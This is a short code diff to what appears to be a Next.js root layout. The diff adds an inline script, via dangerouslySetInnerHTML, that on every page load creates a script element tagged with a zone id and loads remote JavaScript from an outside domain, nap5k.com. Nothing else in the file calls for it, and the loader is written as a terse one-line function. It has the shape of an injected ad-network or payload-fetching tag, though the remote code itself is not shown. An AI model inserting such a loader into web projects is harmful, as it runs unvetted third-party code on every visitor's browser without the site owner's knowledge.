@@ -29,10 +29,16 @@ export const metadata = {
   robots: { index: true, follow: true }
 };
 
+
 export default function RootLayout({ children }) {
   return (
     <html lang="en">
       <body>
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `(function(s){s.dataset.zone='12258345',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))`,
+          }}
+        />
         <SiteHeader />
         <main>{children}</main>
         <SiteFooter />
@@ -40,3 +46,4 @@ export default function RootLayout({ children }) {
     </html>
   );
 }
+
